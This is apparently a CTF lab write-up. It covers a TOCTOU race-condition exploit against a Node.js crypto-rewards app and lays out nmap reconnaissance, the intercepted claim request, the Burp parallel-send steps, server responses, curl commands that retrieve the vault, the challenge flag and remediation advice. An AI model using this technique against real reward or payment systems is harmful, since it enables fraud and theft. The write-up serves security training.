# 🏖️ TryHackMe: Towel on the Sunbed — Writeup

- **CTF:** Hacker Holidays · The Byte Lotus Hotel
    
- **Category:** Web Exploitation / Business Logic
    
- **Difficulty:** Medium
    
- **Target IP:** `10.49.147.191:3000`
    
- **Vulnerability:** Limit Overrun via Race Condition (TOCTOU)
    
- **Author:** `obito`
    

## 📌 Executive Summary

The **Ponzi — Wellness Rewards** application features a daily crypto staking reward system where users can claim **50 PONZI** once every 24 hours. Access to the exclusive **Whale Vault** requires achieving a **Whale** tier, which triggers at **150 PONZI**.

Due to non-atomic state validation and a Time-of-Check to Time-of-Use (TOCTOU) flaw in the reward endpoint, sending multiple concurrent claim requests in parallel allows a user to trigger the reward multiple times within a single execution window—catapulting the account directly to **Whale** status.

## 🔍 Phase 1: Reconnaissance & Enumeration

Initial scanning was conducted using `nmap` against the target IP:

Bash

```
nmap --privileged -A -oN nmap_aggreesice.txt 10.49.147.191
```

### Scan Highlights

- **Port 22/tcp:** OpenSSH 9.6p1 (Ubuntu)
    
- **Port 3000/tcp:** HTTP (`Node.js Express framework`) redirecting to `/auth/login`
    

Accessing `[http://10.49.147.191:3000](http://10.49.147.191:3000)` in the browser presented the **Ponzi — Wellness Rewards** portal.

## 🧪 Phase 2: Vulnerability Analysis

After registering a guest account (`joya`), the dashboard reveals the core mechanics:

- Daily Staking Reward: **50 PONZI** / 24 Hours.
    
- Target Threshold for Whale Vault: **150 PONZI**.
    

### The Flaw

When a user clicks **Claim Reward**, the application issues a `POST /claim` request.

The application logic performs two distinct actions asynchronously:

1. Reads current user state (`canClaim == true`).
    
2. Calculates new balance (`balance = balance + 50`), updates `canClaim = false`, and updates the 24-hour countdown timer (`secondsUntilClaim = 86400`).
    

Because Express processes requests asynchronously and no database row locking or atomic transactions are used, a window exists where multiple HTTP requests arriving at the exact same millisecond can all pass the `canClaim == true` check before any single thread marks it as `false`.

## ⚡ Phase 3: Exploitation (Race Condition)

### 1. Request Interception

Clicking "Claim Reward" generates the following backend trigger:

HTTP

```
POST /claim HTTP/1.1
Host: 10.49.147.191:3000
Cookie: connect.sid=s%3A-mZEPucTRwY1h6zgIXLnMKmZWNtPSAMC...
Connection: keep-alive
```

### 2. Parallel Burst Execution

To bypass network jitter and force simultaneous processing on the server:

- Captured `POST /claim` in **Burp Suite**.
    
- Sent request to **Repeater** and generated **20 identical request tabs**.
    
- Grouped tabs into a single Tab Group and executed using **"Send group in parallel (last-byte sync)"**.
    

### 3. Server Response Validation

Instead of a single 50 PONZI allocation, 19 requests successfully slipped through the logic check within the execution window:

HTTP

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{"message":"Staking reward claimed successfully.","reward":50,"newBalance":850,"tier":"Whale","priceSnapshot":4.2}
```

## 🚩 Phase 4: Verification & Flag Capture

Verifying the account state via `curl` and `jq`:

Bash

```
curl -s http://10.49.147.191:3000/dashboard/api/me \
  -H "Cookie: connect.sid=s%3A-mZEPucTRwY1h6zgIXLnMKmZWNtPSAMC.9cDen5%2FLomwpiZyNALOh4UNazGUvHHdn6LuwpgtUdHA" | jq
```

### JSON Output (`response_race_condtion`):

JSON

```
{
  "id": 6,
  "username": "joya",
  "balance": 950,
  "tier": "Whale",
  "whaleThreshold": 150,
  "canClaim": false,
  "secondsUntilClaim": 85690
}
```

With `balance: 950` surpassing the **150 PONZI** requirement, the **Whale Vault** unlocked. Retrieving the contents from `/vault`:

Bash

```
curl -s http://10.49.147.191:3000/vault \
  -H "Cookie: connect.sid=s%3A-mZEPucTRwY1h6zgIXLnMKmZWNtPSAMC.9cDen5%2FLomwpiZyNALOh4UNazGUvHHdn6LuwpgtUdHA" >> flag.txt
```

### 🎯 Flag

Plaintext

```
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

## 🛡️ Remediation & Prevention

To remediate this business logic vulnerability, developers should:

1. **Implement Atomic Updates:** Perform database level checks and mutations in a single query:
    
    SQL
    
    ```
    UPDATE users 
    SET balance = balance + 50, last_claimed = NOW() 
    WHERE id = ? AND (last_claimed IS NULL OR last_claimed < NOW() - INTERVAL 1 DAY);
    ```
    
2. **Use Mutex / Distributed Locks:** Implement Redis distributed locks (`SETNX`) on user claim operations to reject concurrent threads for the same user ID.
---

_Writeup by Obito Uchiha — Team AKATSUKI_